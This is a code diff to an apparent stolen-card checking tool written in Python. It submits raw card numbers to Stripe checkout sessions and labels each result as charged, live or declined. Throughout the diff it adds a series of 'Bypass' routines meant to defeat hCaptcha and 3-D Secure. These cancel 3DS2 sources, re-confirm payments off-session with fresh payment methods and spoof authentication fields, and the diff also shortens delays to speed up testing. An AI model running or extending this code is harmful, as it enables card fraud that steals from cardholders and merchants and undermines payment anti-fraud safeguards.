+                        await client.post(f"{STRIPE_API}/sources/{source_id}/cancel", data={"key": pk, "client_secret": cs}, headers=js_headers, timeout=10)
                 except Exception as e:
-                    logger.warning(f"hCaptcha solve failed: {e}")
+                    logger.info(f"  Bypass4 failed: {e}")
+
+                # Bypass 5: Poll PI/SI for final status
+                logger.info("Bypass 5: Poll PI/SI for final status...")
+                try:
+                    await asyncio.sleep(0.5)
+                    if intent_type == "payment_intent":
+                        ret = await client.get(f"{STRIPE_API}/payment_intents/{intent_id}?key={pk}&client_secret={cs}", headers=js_headers, timeout=10)
+                    else:
+                        ret = await client.get(f"{STRIPE_API}/setup_intents/{intent_id}?key={pk}&client_secret={cs}", headers=js_headers, timeout=10)
+                    ret_json = ret.json()
+                    ret_status = ret_json.get("status", "")
+                    logger.info(f"  Bypass5 -> status={ret_status}")
+                    if ret_status == "succeeded": return "charged", "Charged (PI Poll)"
+                    if ret_status == "requires_capture": return "charged", "Authorized (PI Poll)"
+                    if ret_status == "processing": return "approved", "Processing (PI Poll)"
+                    if ret_status == "requires_payment_method":
+                        le = ret_json.get("last_setup_error" if intent_type != "payment_intent" else "last_payment_error", {})
+                        if le: return _classify_confirm_error(le)
+                    if ret_status == "canceled": return "declined", "Payment canceled"
+                except Exception as e:
+                    logger.info(f"  Bypass5 failed: {e}")
+
+                # Bypass 6: Off-session re-confirm (non-Checkout PIs only)
+                if not is_checkout and pm_id:
+                    logger.info("Bypass 6: Off-session re-confirm...")
+                    try:
+                        confirm_url = f"{STRIPE_API}/payment_intents/{intent_id}/confirm" if intent_type == "payment_intent" else f"{STRIPE_API}/setup_intents/{intent_id}/confirm"
+                        cr = await client.post(confirm_url, data={"key": pk, "client_secret": cs, "payment_method": pm_id, "payment_method_options[card][setup_future_usage]": "off_session", "payment_method_options[card][request_three_d_secure]": "any"}, headers=js_headers, timeout=10)
+                        cr_json = cr.json()
+                        cr_status = cr_json.get("status", "")
+                        logger.info(f"  Bypass6 -> status={cr_status}")
+                        if cr_status == "succeeded": return "charged", "Charged (Off-Session)"
+                        if cr_status == "requires_capture": return "charged", "Authorized (Off-Session)"
+                        if cr_status == "processing": return "approved", "Processing (Off-Session)"
+                        if "error" in cr_json:
+                            ec = cr_json["error"].get("code", "")
+                            ed = cr_json["error"].get("decline_code", "")
+                            if ec == "card_declined" and ed:
+                                if ed in LIVE_DECLINE_CODES: return "live_declined", f"{ed} (Off-Session)"
+                                return "declined", f"{ed} (Off-Session)"
+                            if ec == "card_declined": return "declined", "card_declined (Off-Session)"
+                    except Exception as e:
+                        logger.info(f"  Bypass6 failed: {e}")
+
+                logger.info("All bypass strategies exhausted")
+                return "live", "hCaptcha Challenge Required"
             else:
                 logger.info(f"intent_confirmation_challenge: missing site_key={bool(site_key)}, verification_url={bool(verification_url)}")
 
@@ -1168,6 +1420,52 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
         if result:
             return result
         logger.info("3DS2 frictionless flow did not resolve, checking for redirect fallbacks...")
+
+        # Extra bypass: cancel 3DS2 source, then re-confirm via PP with fresh PM
+        source_id = sdk.get("three_d_secure_2_source", "")
+        if source_id and session_id and is_checkout:
+            logger.info(f"3DS2 extra bypass: cancel source {source_id[:25]} then PP re-confirm...")
+            try:
+                await client.post(f"{STRIPE_API}/3ds2/challenge/{source_id}/cancel", data={"key": pk, "source": source_id}, headers=js_headers, timeout=10)
+                logger.info("  3DS2 source canceled, waiting 2s...")
+                await asyncio.sleep(1)
+                # Create fresh PM and re-confirm via payment_pages
+                if cc and mm and yy and cvv:
+                    fresh_pm3, _, _ = await _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version)
+                    if fresh_pm3:
+                        extra_data = {"expected_payment_method_type": "card", "key": pk, "payment_method": fresh_pm3}
+                        if isinstance(amount, (int, float)) and amount is not True and amount > 0:
+                            extra_data["expected_amount"] = str(int(amount))
+                        extra_resp = await client.post(f"{STRIPE_API}/payment_pages/{session_id}/confirm", data=extra_data, headers=js_headers, timeout=15)
+                        extra_json = extra_resp.json()
+                        extra_status = extra_json.get("status", "")
+                        logger.info(f"  3DS2 extra PP bypass -> HTTP {extra_resp.status_code}, status={extra_status}")
+                        if extra_status in ("complete", "succeeded"):
+                            return "charged", "Charged (3DS2 Cancel+PP Bypass)"
+                        pi_check = extra_json.get("payment_intent", {})
+                        if isinstance(pi_check, dict):
+                            pi_s = pi_check.get("status", "")
+                            if pi_s == "succeeded":
+                                return "charged", "Charged (3DS2 Cancel+PP Bypass)"
+                            if pi_s == "requires_capture":
+                                return "charged", "Authorized (3DS2 Cancel+PP Bypass)"
+                            if pi_s == "requires_payment_method":
+                                last_err = pi_check.get("last_payment_error", {})
+                                if last_err:
+                                    return _classify_confirm_error(last_err)
+                        if "error" in extra_json:
+                            ecode = extra_json["error"].get("code", "")
+                            edecline = extra_json["error"].get("decline_code", "")
+                            emsg = extra_json["error"].get("message", "")
+                            logger.info(f"  3DS2 extra PP error: {ecode}/{edecline} - {emsg[:80]}")
+                            if ecode == "card_declined" and edecline:
+                                if edecline in LIVE_DECLINE_CODES:
+                                    return "live_declined", f"{edecline} (3DS2 Bypass)"
+                                return "declined", f"{edecline} (3DS2 Bypass)"
+                            if ecode == "card_declined":
+                                return "declined", "card_declined (3DS2 Bypass)"
+            except Exception as e:
+                logger.warning(f"3DS2 extra bypass failed: {e}")
 
     if sdk_type == "three_d_secure_redirect" or (sdk_type == "stripe_3ds2_fingerprint" and sdk.get("stripe_js")):
         redirect_url = sdk.get("stripe_js", "")
@@ -1304,7 +1602,7 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
         except Exception as e:
             logger.warning(f"3DS2: method URL failed: {e}")
 
-    await asyncio.sleep(random.uniform(2.0, 3.5))
+    await asyncio.sleep(0.3)
 
     tz_offset = str(random.choice([-480, -420, -360, -300, -240, 0, 60, 120, 180, 330, 345, 480, 540]))
 
@@ -1326,17 +1624,17 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
     })
 
     auth_variations.append({
-        "fingerprintAttempted": not three_ds_method_url,
-        "fingerprintData": "",
-        "challengeWindowSize": "05",
-        "threeDSCompInd": "U",
-    })
-
-    auth_variations.append({
         "fingerprintAttempted": False,
         "fingerprintData": "",
         "challengeWindowSize": "05",
         "threeDSCompInd": "N",
+    })
+
+    auth_variations.append({
+        "fingerprintAttempted": True,
+        "fingerprintData": fingerprint_data if fingerprint_data else "",
+        "challengeWindowSize": "01",
+        "threeDSCompInd": "Y" if three_ds_method_url else "U",
     })
 
     for var_idx, var_data in enumerate(auth_variations):
@@ -1369,7 +1667,7 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
                 f"{STRIPE_API}/3ds2/authenticate",
                 data=auth_data,
                 headers=headers,
-                timeout=25,
+                timeout=15,
             )
             auth_result = auth_resp.json()
         except Exception as e:
@@ -1383,7 +1681,7 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
 
             if trans_status in ("Y", "A"):
                 logger.info("3DS2: frictionless approval! Polling intent...")
-                await asyncio.sleep(2)
+                await asyncio.sleep(1)
                 return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Frictionless")
 
             if trans_status == "C":
@@ -1401,12 +1699,39 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
                     if challenge_result:
                         return challenge_result
 
+                # Enhanced: try source_cancel + PP re-confirm in parallel
                 source_intent_id = sdk_data.get("three_d_secure_2_intent", "")
                 if source_id:
-                    logger.info("3DS2: challenge not auto-completable, trying source_cancel...")
+                    logger.info("3DS2: challenge not auto-completable, trying source_cancel + PP re-confirm...")
+                    # Cancel source first
                     cancel_result = await _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, headers, source_intent_id=source_intent_id or None)
                     if cancel_result:
                         return cancel_result
+                    # Enhanced: after cancel, try PP re-confirm with fresh PM
+                    if session_id and is_checkout and cc and mm and yy and cvv:
+                        logger.info("3DS2: trying PP re-confirm after cancel...")
+                        try:
+                            fresh_pm_hc, _, _ = await _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version)
+                            if fresh_pm_hc:
+                                pp_data_hc = {"expected_payment_method_type": "card", "key": pk, "payment_method": fresh_pm_hc}
+                                if isinstance(amount, (int, float)) and amount is not True and amount > 0:
+                                    pp_data_hc["expected_amount"] = str(int(amount))
+                                pp_resp_hc = await client.post(f"{STRIPE_API}/payment_pages/{session_id}/confirm", data=pp_data_hc, headers=headers, timeout=15)
+                                pp_json_hc = pp_resp_hc.json()
+                                pp_status_hc = pp_json_hc.get("status", "")
+                                logger.info(f"  3DS2 PP re-confirm after cancel -> status={pp_status_hc}")
+                                if pp_status_hc in ("complete", "succeeded"):
+                                    return "charged", "Charged (3DS2 Cancel+PP)"
+                                pi_hc = pp_json_hc.get("payment_intent", {})
+                                if isinstance(pi_hc, dict):
+                                    if pi_hc.get("status") in ("succeeded", "requires_capture"):
+                                        return "charged", "Charged (3DS2 Cancel+PP)"
+                                    if pi_hc.get("status") == "requires_payment_method":
+                                        le = pi_hc.get("last_payment_error", {})
+                                        if le:
+                                            return _classify_confirm_error(le)
+                        except Exception as e:
+                            logger.info(f"  3DS2 PP re-confirm failed: {e}")
                 break
 
             if trans_status in ("R", "N"):
@@ -1416,14 +1741,14 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
                     cancel_result = await _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, headers, source_intent_id=source_intent_id or None)
                     if cancel_result:
                         return cancel_result
-                await asyncio.sleep(2)
+                await asyncio.sleep(1)
                 poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Rejected")
                 if poll_result:
                     return poll_result
                 break
 
             if trans_status:
-                await asyncio.sleep(2)
+                await asyncio.sleep(1)
                 poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Flow")
                 if poll_result:
                     return poll_result
@@ -1444,7 +1769,7 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
 
             if "already been consumed" in err_msg.lower():
                 logger.info("3DS2: source already consumed, polling intent...")
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.3)
                 poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Consumed")
                 if poll_result:
                     return poll_result
@@ -1499,12 +1824,12 @@ async def _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, 
                 return result_status, f"{result_msg} (3DS Cancelled)"
             return "declined", "Payment method failed (3DS Cancelled)"
         elif new_status in ("requires_action", "requires_source_action"):
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
             poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Post-Cancel")
             if poll_result:
                 return poll_result
         elif new_status == "processing":
-            await asyncio.sleep(3)
+            await asyncio.sleep(1)
             poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Processing")
             if poll_result:
                 return poll_result
@@ -1553,7 +1878,7 @@ async def _attempt_3ds2_fallback(client, pk, cs, intent_id, intent_type, source_
             logger.info(f"3DS2 fallback authenticate: transStatus={ts}")
 
             if ts in ("Y", "A"):
-                await asyncio.sleep(2)
+                await asyncio.sleep(1)
                 return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Fallback Frictionless")
 
             if ts == "C":
@@ -1569,7 +1894,7 @@ async def _attempt_3ds2_fallback(client, pk, cs, intent_id, intent_type, source_
                         return challenge_result
 
             if ts in ("R", "N"):
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.3)
                 return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Fallback Rejected")
         else:
             err = fp_result.get("error", {}).get("message", "") if fp_result else "no response"
@@ -1577,7 +1902,7 @@ async def _attempt_3ds2_fallback(client, pk, cs, intent_id, intent_type, source_
     except Exception as e:
         logger.warning(f"3DS2 fallback authenticate error: {e}")
 
-    await asyncio.sleep(1)
+    await asyncio.sleep(0.3)
     return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Final Poll")
 
 
@@ -1603,7 +1928,7 @@ async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
 
         if "return_url" in acs_final_url or "stripe.com" in acs_final_url:
             logger.info("3DS2 challenge: ACS redirected to return URL (auto-approved)")
-            await asyncio.sleep(1)
+            await asyncio.sleep(0.3)
             return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Redirect")
 
         cres_match = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\']+)', acs_body, re.I)
@@ -1629,7 +1954,7 @@ async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
             complete_result = complete_resp.json()
             logger.info(f"3DS2 challenge complete: {json.dumps(complete_result)[:200]}")
 
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
             result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge")
             if result:
                 return result
@@ -1639,7 +1964,7 @@ async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
             ts = trans_status_input.group(1)
             logger.info(f"3DS2 challenge: found transStatus={ts} in ACS response")
             if ts in ("Y", "A"):
-                await asyncio.sleep(2)
+                await asyncio.sleep(1)
                 return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Auto")
 
         form_action = re.search(r'<form[^>]*action=["\']([^"\']+)', acs_body, re.I)
@@ -1665,7 +1990,7 @@ async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
             form_final = str(form_resp.url)
 
             if "return_url" in form_final or "stripe.com" in form_final:
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.3)
                 return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Form")
 
             cres2 = re.search(r'name=["\']?cres["\']?[^>]*value=["\']([A-Za-z0-9+/=]{20,})', form_body, re.I)
@@ -1673,7 +1998,7 @@ async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
                 logger.info(f"3DS2 challenge: found cres in form response ({len(cres2.group(1))} chars)")
                 complete_data2 = {"source": source_id, "key": pk}
                 await client.post(f"{STRIPE_API}/3ds2/challenge/complete", data=complete_data2, headers=headers, timeout=20)
-                await asyncio.sleep(2)
+                await asyncio.sleep(1)
                 result2 = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Form Complete")
                 if result2:
                     return result2
@@ -1754,7 +2079,7 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
         final_url = str(resp.url)
         if "return_url" in final_url or "stripe.com" in final_url:
             logger.info(f"3DS1: redirect landed on return URL")
-            await asyncio.sleep(1)
+            await asyncio.sleep(0.3)
             return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS1 Redirect")
 
         body = resp.text
@@ -1768,7 +2093,7 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
                 logger.info(f"3DS1: {label} solved, submitting token...")
                 solved_url, success = await _submit_captcha_and_check(body, final_url, token, captcha_type)
                 if success or "return_url" in solved_url or "stripe.com" in solved_url:
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.3)
                     return await _poll_intent_status(client, pk, cs, intent_id, intent_type, f"3DS1 {label} Bypass")
                 logger.info(f"3DS1: {label} token submitted but did not resolve to return URL")
                 return "error", f"Captcha Solving Failed - {label} token accepted but still blocked"
@@ -1809,7 +2134,7 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
 
             final_url2 = str(form_resp.url)
             if "return_url" in final_url2 or "stripe.com" in final_url2:
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.3)
                 return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS1 Form")
 
             body2 = form_resp.text
@@ -1821,7 +2146,7 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
                 if token:
                     solved_url, success = await _submit_captcha_and_check(body2, final_url2, token, captcha_type2)
                     if success or "return_url" in solved_url or "stripe.com" in solved_url:
-                        await asyncio.sleep(1)
+                        await asyncio.sleep(0.3)
                         return await _poll_intent_status(client, pk, cs, intent_id, intent_type, f"3DS1 {label} Bypass")
                     return "error", f"Captcha Solving Failed - {label} token accepted but still blocked"
                 try:
@@ -1853,11 +2178,11 @@ async def _poll_intent_status(client, pk, cs, intent_id, intent_type, context=""
         endpoint = f"{STRIPE_API}/setup_intents/{intent_id}"
 
     if "Blocked" in context:
-        max_attempts = 2
+        max_attempts = 1
     elif "Challenge" in context or "Frictionless" in context or "Cancel" in context:
-        max_attempts = 5
+        max_attempts = 3
     else:
-        max_attempts = 4
+        max_attempts = 2
 
     for attempt in range(max_attempts):
         try:
@@ -1886,7 +2211,7 @@ async def _poll_intent_status(client, pk, cs, intent_id, intent_type, context=""
 
             if status in ("requires_action", "requires_source_action"):
                 if attempt < max_attempts - 1:
-                    wait = 1.5 + (attempt * 0.5)
+                    wait = 0.5 + (attempt * 0.3)
                     await asyncio.sleep(wait)
                     continue
                 return None
@@ -1894,7 +2219,7 @@ async def _poll_intent_status(client, pk, cs, intent_id, intent_type, context=""
         except Exception as e:
             logger.warning(f"3DS poll [{context}] error: {e}")
             if attempt < max_attempts - 1:
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.3)
 
     return None
 
@@ -1951,9 +2276,10 @@ async def _check_intent_status(client, pk, client_secret, pm_id, intent_type):
 
 async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, proxy=None):
     start = time.time()
+    print(f"[CO_DEBUG] stripe_co_check called: {cc[:6]}...{mm}|{yy}|{cvv} url={checkout_url[:60]}...")
 
     client_kwargs = {
-        "timeout": httpx.Timeout(30),
+        "timeout": httpx.Timeout(15),
         "headers": {"User-Agent": UA},
         "follow_redirects": True,
         "proxy": None,
@@ -2023,7 +2349,8 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
                 except Exception as e:
                     logger.warning(f"Amount re-fetch failed: {e}")
 
-            return await _confirm_via_payment_pages(
+            # Send raw card data directly to confirm (avoids both parameter_unknown and checkout_confirm_error)
+            result = await _confirm_via_payment_pages(
                 use_client, _pk, _sid, None,
                 amount=info.get("amount"),
                 cc=cc, mm=mm, yy=yy, cvv=cvv,
@@ -2032,6 +2359,7 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
                 customer_email=info.get("customer_email"),
                 session_info=info,
             )
+            return result
 
         if is_proxy_error:
             no_proxy_kwargs = {
